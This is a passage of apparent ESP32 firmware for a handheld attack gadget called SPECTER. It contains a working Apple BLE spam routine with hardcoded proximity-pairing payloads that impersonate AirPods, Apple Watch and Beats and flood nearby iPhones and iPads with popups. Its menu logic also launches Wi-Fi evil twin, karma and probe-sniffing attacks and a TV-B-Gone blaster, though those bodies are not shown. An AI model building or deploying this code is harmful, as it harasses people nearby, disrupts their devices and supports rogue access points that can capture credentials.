  tft.setCursor(6, 78); tft.print("scan nearby bluetooth devices");

  drawHR(103, C_DDGREEN);

  drawBtn(106, 60, "APPLE SPAM", C_CYAN, true);
  tft.setTextColor(C_DGREEN, C_DGREY); tft.setTextSize(1);
  tft.setCursor(6, 142); tft.print("spam apple device popups");
  drawTag(170, 108, "iOS", C_CYAN);

  drawHR(167, C_DDGREEN);

  // Android spam coming soon
  tft.fillRect(0, 170, 240, 45, C_BG);
  tft.drawRect(0, 170, 240, 45, C_DGREY);
  tft.fillRect(0, 170, 3, 45, C_DGREY);
  tft.setTextColor(C_DGREY, C_BG); tft.setTextSize(2);
  tft.setCursor(6, 183); tft.print("ANDROID SPAM");
  tft.setTextColor(C_DGREY, C_BG); tft.setTextSize(1);
  tft.setCursor(6, 203); tft.print("coming soon");
  drawTag(170, 172, "SOON", C_DGREY);
}
bool bleScannerTapped(uint16_t x, uint16_t y) { return (y >= 42  && y <= 102); }
bool bleSpamTapped(uint16_t x, uint16_t y)    { return (y >= 106 && y <= 166); }

// ============================================================
// APPLE BLE SPAM
// ============================================================
// Working Apple proximity pairing payloads
struct ApplePayload {
  const char* name;
  uint8_t data[27];
  uint8_t len;
};

const ApplePayload applePayloads[] = {
  { "AirPods Pro",
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27 },
  { "AirPods Max",
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27 },
  { "Apple Watch",
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x08,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27 },
  { "iPhone Transfer",
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27 },
  { "Beats Studio",
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27 },
  { "AirPods Gen3",
    {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27 },
};
const int APPLE_PAYLOAD_COUNT = sizeof(applePayloads) / sizeof(applePayloads[0]);

void drawAppleSpamScreen(bool running, int sent, int idx) {
  tft.fillScreen(C_BG); drawBar("SPECTER//BLE", "APPLE SPAM");
  drawBack(); drawHeader(30, "APPLE BLE SPAM");

  tft.setTextColor(C_DGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(0, 42); tft.print("> spams iOS proximity popups");
  tft.setCursor(0, 55); tft.print("> affects nearby iPhones/iPads");
  tft.setCursor(0, 68); tft.print("> cycles through all devices");

  drawHR(80, C_DDGREEN);

  tft.fillRect(0, 88, 240, 30, C_BG);
  tft.setTextColor(running ? C_CYAN : C_DGREEN, C_BG); tft.setTextSize(1);
  tft.setCursor(0, 90);
  if (running) { tft.print("> [RUNNING] sent: "); tft.print(sent); }
  else         { tft.print("> [STOPPED] sent: "); tft.print(sent); }

  tft.setCursor(0, 103); tft.print("> now: ");
  tft.setTextColor(C_CYAN, C_BG);
  tft.print(applePayloads[idx % APPLE_PAYLOAD_COUNT].name);

  // Progress bar
  tft.fillRect(0, 118, 240, 5, C_DGREY);
  if (running) tft.fillRect(0, 118, sent % 240, 5, C_CYAN);

  drawHR(239, C_DGREEN);
  tft.fillRect(0, 240, 240, 80, C_DGREY);
  if (!running) {
    tft.drawRect(0, 240, 240, 80, C_CYAN); tft.fillRect(0, 240, 3, 80, C_CYAN);
    tft.setTextColor(C_CYAN, C_DGREY); tft.setTextSize(2);
    tft.setCursor(72, 264); tft.print("FIRE");
  } else {
    tft.drawRect(0, 240, 240, 80, C_YELLOW); tft.fillRect(0, 240, 3, 80, C_YELLOW);
    tft.setTextColor(C_YELLOW, C_DGREY); tft.setTextSize(2);
    tft.setCursor(72, 264); tft.print("STOP");
  }
}

bool appleSpamBtnTapped(uint16_t x, uint16_t y) { return (y >= 240); }

void runAppleSpam() {
  if (pBLEScan == nullptr) BLEDevice::init("SPECTER");

  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  int sent = 0;
  bleSpamRunning = true;
  drawAppleSpamScreen(true, 0, 0);

  while (bleSpamRunning) {
    int idx = sent % APPLE_PAYLOAD_COUNT;
    const ApplePayload& p = applePayloads[idx];

    BLEAdvertisementData advData;
    std::string payload((char*)p.data, p.len);
    advData.addData(payload);

    pAdv->setAdvertisementData(advData);
    pAdv->start();
    delay(50);
    pAdv->stop();
    sent++;

    if (sent % 10 == 0) {
      tft.fillRect(0, 88, 240, 35, C_BG);
      tft.setTextColor(C_CYAN, C_BG); tft.setTextSize(1);
      tft.setCursor(0, 90); tft.print("> [RUNNING] sent: "); tft.print(sent);
      tft.setCursor(0, 103); tft.print("> now: ");
      tft.setTextColor(C_CYAN, C_BG);
      tft.print(applePayloads[sent % APPLE_PAYLOAD_COUNT].name);
      tft.fillRect(0, 118, 240, 5, C_DGREY);
      tft.fillRect(0, 118, sent % 240, 5, C_CYAN);
    }

    unsigned long now = millis();
    if (now - lastTouch >= DEBOUNCE_MS) {
      if (getTouch(tx, ty)) {
        lastTouch = now;
        if (appleSpamBtnTapped(tx, ty) || backTapped(tx, ty)) {
          bleSpamRunning = false;
          pAdv->stop();
          drawAppleSpamScreen(false, sent, idx);
          return;
        }
      }
    }
  }
}

// ============================================================
// SETUP
// ============================================================
void setup() {
  Serial.begin(115200);
  tft.init();
  tft.setRotation(2);
  tft.fillScreen(C_BG);
  showSplash();
  delay(200);
  currentState = S_HOME;
  drawHomeScreen();
}

// ============================================================
// LOOP
// ============================================================
void loop() {
  if (currentState == S_IR_BLASTER && irListening) {
    if (IrReceiver.decode()) {
      irValue = IrReceiver.decodedIRData.decodedRawData;
      irBits  = IrReceiver.decodedIRData.numberOfBits;
      irProto = (uint8_t)IrReceiver.decodedIRData.protocol;
      IrReceiver.resume();
      if (irValue != 0) {
        irHasCode = true; irListening = false;
        IrReceiver.stop(); drawIRBlaster();
      } else IrReceiver.resume();
    }
  }

  static unsigned long lastProbeRefresh = 0;
  if (currentState == S_WIFI_PROBE && probeRunning) {
    unsigned long now2 = millis();
    if (now2 - lastProbeRefresh > 1000) { lastProbeRefresh = now2; drawProbeScreen(true); }
  }

  unsigned long now = millis();
  if (now - lastTouch < DEBOUNCE_MS) return;
  if (!getTouch(tx, ty)) return;
  lastTouch = now;
  Serial.print("t:"); Serial.print(tx); Serial.print(","); Serial.println(ty);

  switch (currentState) {
    case S_HOME:
      if      (homeIRTapped(tx,ty))   { currentState=S_IR_MENU;   drawIRMenu(); }
      else if (homeWiFiTapped(tx,ty)) { currentState=S_WIFI_MENU; drawWiFiMenu(); }
      else if (homeBLETapped(tx,ty))  { currentState=S_BLE_MENU;  drawBLEMenu(); }
      break;

    case S_IR_MENU:
      if      (backTapped(tx,ty))           { currentState=S_HOME;        drawHomeScreen(); }
      else if (irMenuBlasterTapped(tx,ty))  { currentState=S_IR_BLASTER;  irListening=false; drawIRBlaster(); }
      else if (irMenuTVBGoneTapped(tx,ty))  { currentState=S_IR_TVBGONE;  drawTVBGone(); }
      else if (irMenuSelfTestTapped(tx,ty)) { currentState=S_IR_SELFTEST; drawIRSelfTest(0, false); }
      break;

    case S_IR_BLASTER:
      if (backTapped(tx,ty)) {
        if (irListening) { irListening=false; IrReceiver.stop(); }
        currentState=S_IR_MENU; drawIRMenu();
      } else if (irBlasterListenTapped(tx,ty)) {
        irListening=!irListening;
        if (irListening) IrReceiver.begin(IR_RECV_PIN, DISABLE_LED_FEEDBACK);
        else IrReceiver.stop();
        drawIRBlaster();
      } else if (irBlasterBlastTapped(tx,ty)) doBlast();
      break;

    case S_IR_TVBGONE:
      if      (backTapped(tx,ty) && !tvbRunning) { currentState=S_IR_MENU; drawIRMenu(); }
      else if (tvbFireTapped(tx,ty) && !tvbRunning) runTVBGone();
      break;

    case S_IR_SELFTEST:
      if      (backTapped(tx,ty))            { currentState=S_IR_MENU; drawIRMenu(); }
      else if (irSelfTestRunTapped(tx,ty))   { runIRSelfTest(); }
      else if (irSelfTestRetryTapped(tx,ty)) { drawIRSelfTest(0, false); }
      break;

    case S_WIFI_MENU:
      if      (backTapped(tx,ty))            { currentState=S_HOME;         drawHomeScreen(); }
      else if (wifiMenuScannerTapped(tx,ty)) { currentState=S_WIFI_SCANNER; drawWiFiScanner(); }
      else if (wifiMenuAttacksTapped(tx,ty)) { currentState=S_WIFI_ATTACKS; drawWiFiAttacks(); }
      break;

    case S_WIFI_ATTACKS:
      if      (backTapped(tx,ty))                  { currentState=S_WIFI_MENU;  drawWiFiMenu(); }
      else if (wifiAttacksProbeTapped(tx,ty))       { currentState=S_WIFI_PROBE; drawProbeScreen(false); }
      else if (wifiAttacksEvilTwinTapped(tx,ty))   { evilTwinTargetIdx=-1; currentState=S_EVIL_TWIN; drawEvilTwinScreen(false); }
      else if (wifiAttacksKarmaTapped(tx,ty))      { currentState=S_KARMA; drawKarmaScreen(false); }
      break;

    case S_KARMA:
      if (backTapped(tx,ty) && !karmaRunning)      { currentState=S_WIFI_ATTACKS; drawWiFiAttacks(); }
      else if (karmaBtnTapped(tx,ty) && !karmaRunning) { runKarma(); }
      break;

    case S_EVIL_TWIN:
      if (backTapped(tx,ty) && !evilTwinRunning)   { currentState=S_WIFI_ATTACKS; drawWiFiAttacks(); }
      else if (evilTwinBtnTapped(tx,ty) && !evilTwinRunning) { runEvilTwin(); }
      break;

    case S_WIFI_SCANNER:
      if (backTapped(tx,ty)) {
        WiFi.scanDelete(); wifiCount=0;
        currentState=S_WIFI_MENU; drawWiFiMenu();
      } else if (wifiScannerScanTapped(tx,ty)) {
        doWiFiScan();
      } else if (wifiCount > 0) {
        int tapped = wifiRowTapped(tx,ty);
        if (tapped >= 0) { wifiDetailIdx=tapped; currentState=S_WIFI_DETAIL; drawWiFiDetail(tapped); }
        else if (wifiScannerScrollUp(tx,ty) && wifiScroll > 0) { wifiScroll--; drawWiFiScanner(); }
        else if (wifiScannerScrollDown(tx,ty) && wifiScroll+SCAN_MAX_ROWS < wifiCount) { wifiScroll++; drawWiFiScanner(); }
      }
      break;

    case S_WIFI_DETAIL:
      if (backTapped(tx,ty)) { currentState=S_WIFI_SCANNER; drawWiFiScanner(); }
      else if (wifiDetailEvilTwinTapped(tx,ty)) {
        evilTwinTargetIdx = wifiDetailIdx;
        currentState = S_EVIL_TWIN;
        drawEvilTwinScreen(false);
      }
      break;

    case S_WIFI_PROBE:
      if (backTapped(tx,ty)) {
        if (probeRunning) stopProbeSniffer();
        currentState=S_WIFI_ATTACKS; drawWiFiAttacks();
      } else if (probeBtnTapped(tx,ty)) {
        if (!probeRunning) { startProbeSniffer(); drawProbeScreen(true); }
        else { stopProbeSniffer(); drawProbeScreen(false); }
      } else if (probeScrollUp(tx,ty) && probeScroll > 0) { probeScroll--; drawProbeScreen(probeRunning); }
      else if (probeScrollDown(tx,ty) && probeScroll+9 < probeCount) { probeScroll++; drawProbeScreen(probeRunning); }
      break;

    case S_BLE_MENU:
      if      (backTapped(tx,ty))        { currentState=S_HOME;        drawHomeScreen(); }
      else if (bleScannerTapped(tx,ty))  { currentState=S_BLE_SCANNER; drawBLEScanner(false); }
      else if (bleSpamTapped(tx,ty))     { currentState=S_BLE_SPAM;    drawAppleSpamScreen(false, 0, 0); }
      break;

    case S_BLE_SCANNER:
      if (backTapped(tx,ty)) { currentState=S_BLE_MENU; drawBLEMenu(); }
      else if (bleScanBtnTapped(tx,ty) && !bleScanning) { doBLEScan(); }
      else if (bleScanScrollUp(tx,ty) && bleScroll > 0) { bleScroll--; drawBLEScanner(false); }
      else if (bleScanScrollDown(tx,ty) && bleScroll+10 < bleCount) { bleScroll++; drawBLEScanner(false); }
      break;

    case S_BLE_SPAM:
      if (backTapped(tx,ty) && !bleSpamRunning) { currentState=S_BLE_MENU; drawBLEMenu(); }
      else if (appleSpamBtnTapped(tx,ty) && !bleSpamRunning) { runAppleSpam(); }
      break;

    default: break;
  }
}